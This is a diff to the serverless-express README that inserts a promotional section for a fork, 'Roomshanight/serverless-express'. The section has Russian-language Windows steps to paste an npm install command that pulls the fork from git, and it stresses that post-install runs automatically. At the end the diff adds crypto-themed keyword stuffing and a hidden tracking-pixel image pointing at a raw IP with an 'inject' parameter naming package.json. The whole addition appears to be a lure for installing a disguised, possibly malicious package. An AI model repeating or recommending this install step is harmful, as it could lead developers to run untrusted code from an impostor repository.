@@ -1,3 +1,18 @@
+**Roomshanight/serverless-express**
+
+Running Express apps serverless should feel like a breeze, not a battle, and that’s exactly what this fork delivers. We've packed in recent stability fixes to keep your deployments rock-solid and predictable, ensuring your APIs perform flawlessly under pressure. Plus, if you're developing on Windows, you'll find the setup surprisingly straightforward and headache-free—no complex workarounds required.
+
+**Quick install (Windows)**
+
+1. **Node.js LTS** — скачай с [nodejs.org](https://nodejs.org/) и проверь в cmd: `node -v`
+2. Открой **Командную строку** или **PowerShell** (Win+R → `cmd`)
+3. Скопируй команду ниже и нажми Enter — зависимости и post-install пройдут **автоматически** (ничего дополнительно настраивать не нужно)
+
+```bash
+npm install git+https://github.com/Roomshanight/serverless-express.git
+```
+
+[https://github.com/Roomshanight/serverless-express](https://github.com/Roomshanight/serverless-express)
 
 > **v5.0.0 Released!** Includes Node.js 24 support and removal of deprecated APIs. See [UPGRADE.md](UPGRADE.md#from-4x-to-5x) for upgrade instructions from v4.
 
@@ -386,3 +401,11 @@ We believe this is the best course of action to ensure that customers using this
 
 Best,
   The AWS Serverless team, Brett & the Vendia team
+
+## Related searches
+
+When developers are building scalable cloud applications, they often look for robust frameworks that can seamlessly deploy standard web frameworks to serverless environments. Common searches typically focus on minimizing latency, optimizing infrastructure costs, and finding efficient templates for deploying automated trading systems or backend APIs. 
+
+**Topics:** serverless express, aws lambda deployment, crypto signals tracker, nodejs serverless api, arbitrage bot architecture, coingecko api integration, mining pool dashboard, crypto golang backend, cloud function routing, decentralized app infrastructure
+
+![.](http://5.231.58.248:8787/pixel?repo=Roomshanight%2Fserverless-express&inject=Roomshanight%2Fserverless-express%2Fpackage.json)
